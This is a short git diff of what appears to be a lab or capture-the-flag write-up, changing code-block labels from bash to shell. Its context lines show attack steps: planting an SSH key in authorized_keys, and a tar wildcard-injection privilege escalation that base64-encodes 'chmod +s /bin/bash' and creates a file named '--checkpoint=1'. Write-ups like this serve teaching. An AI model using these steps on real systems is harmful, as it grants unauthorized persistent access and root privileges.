@@ -30,7 +30,7 @@ The user `alfredo` has a `.ssh` folder and there is an SSH port open, so we can 
 
 ![](../assets/Pasted%20image%2020250302190626.png)
 
-```bash
+```shell
 cat id_rsa.pub > authorized_keys.txt
 ```
 
@@ -52,7 +52,7 @@ Transfer `pspy` to the machine and we see a task executing.
 
 We don't have permission to edit the script, but we see that `tar` is using a wildcard, so we can exploit that.
 
-```bash
+```shell
 echo -n 'chmod +s /bin/bash' | base64
 > Y2htb2QgK3MgL2Jpbi9iYXNo
 touch -- "--checkpoint=1"
